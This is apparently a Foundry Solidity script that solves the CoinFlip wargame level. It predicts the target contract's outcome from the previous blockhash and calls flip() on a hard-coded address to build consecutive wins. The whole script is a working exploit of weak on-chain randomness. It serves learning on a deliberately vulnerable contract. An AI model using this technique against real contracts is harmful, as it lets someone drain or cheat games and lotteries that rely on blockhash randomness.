// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "../src/coinflip.sol";

contract coinFlipScript is Script {
    CoinFlip public contractInstance;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function setUp() public {
        contractInstance = CoinFlip(0x9a8fAa45b7c64B1f9DE45DF20be381529258D0fD);
    }

    function run() public {
        vm.startBroadcast();

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        contractInstance.flip(side);
        console2.log("Consecutive Wins: ", contractInstance.consecutiveWins());

        vm.stopBroadcast();
    }
}
